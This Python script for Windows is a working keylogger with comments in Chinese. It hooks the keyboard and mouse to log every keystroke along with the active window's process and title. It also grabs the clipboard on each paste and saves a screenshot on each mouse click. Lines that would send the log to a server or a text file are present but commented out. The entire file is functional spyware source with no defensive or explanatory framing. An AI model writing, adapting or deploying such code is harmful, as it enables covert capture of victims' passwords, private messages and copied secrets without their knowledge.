#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from ctypes import *
import pythoncom
import pyHook
import win32clipboard
import win32api
import time
from PIL import ImageGrab

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

def Get_pingmu_jietu():
    pic_name = time.strftime('%Y%m%d%H%M%S',time.localtime(time.time()))
    #将用户屏幕截图，保存到本地某个目录下
    pic = ImageGrab.grab()
    pic.save('Image/屏幕截图_%s.png' % pic_name)


def get_current_process():
    # 获取最上层的窗口句柄
    hwnd = user32.GetForegroundWindow()
    # 获取进程ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd,byref(pid))
  
    # 将进程ID存入变量中
    process_id = "%d" % pid.value
    # 申请内存
    executable = create_string_buffer(512)
    h_process = kernel32.OpenProcess(0x400 | 0x10,False,pid)
    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
  
    # 读取窗口标题
    # length = user32.GetWindowTextW(hwnd,byref(windows_title),512)
    windows_title = create_string_buffer(512)
    win_len = user32.GetWindowTextLengthW(hwnd)
    if win_len>0:
        user32.GetWindowTextA(hwnd,byref(windows_title), win_len + 1);

    global current_window
    global MSG;

    # 打印
    widowsName=windows_title.value.decode('GBK')
    # 检测目标窗口是否转移(换了其他窗口就监听新的窗口)
    if current_window!=widowsName:
        current_window=widowsName;
        print(MSG);
        message='[ PID:%s-%s-%s]' % (process_id,executable.value,widowsName);
        MSG='\r\n '+message+'\r\n';
        # print();
        # print("[ PID:%s-%s-%s]" % (process_id,executable.value,widowsName));
        # print();
    # 关闭handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
    if current_window!=widowsName:
        return True;
    else:
        return False;

# 监听鼠标事件     
def onMouseEvent(event): 
    global MSG;
    if len(MSG)!=0:        
        #send_msg_to_server(MSG)
        # write_msg_to_txt(MSG)
        print(MSG);
        MSG='';
        Get_pingmu_jietu();
    return True

# 定义击键监听事件函数
def KeyStroke(event):
  
    # F12 关闭程序 测试使用
    if str(event.Key)=='F12':
        print("关闭程序")
        win32api.PostQuitMessage()
    get_current_process()
    global MSG
    # 检测击键是否常规按键（非组合键等）
    if event.Ascii > 32 and event.Ascii <127:
        message=chr(event.Ascii);
        MSG=str(MSG)+str(message);
    elif event.Ascii==32:
        MSG=str(MSG)+' ';
    #9为tab  13为确定
    elif event.Ascii==9 or event.Ascii==13:
        print(MSG);
        MSG='';
    else:    
        # 如果发现Ctrl+v（粘贴）事件，就把粘贴板内容记录下来
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            MSG=str(MSG)+"[PASTE]-%s" % (pasted_value)            
        else:
            MSG=str(MSG)+"[%s]" % event.Key
    # 循环监听下一个击键事件
    return True


kl = pyHook.HookManager()
kl.KeyDown = KeyStroke
kl.HookKeyboard()
#随表左建
kl.SubscribeMouseLeftDown=onMouseEvent
kl.HookMouse()

if __name__ == '__main__':
    MSG = ''
    pythoncom.PumpMessages(2000);
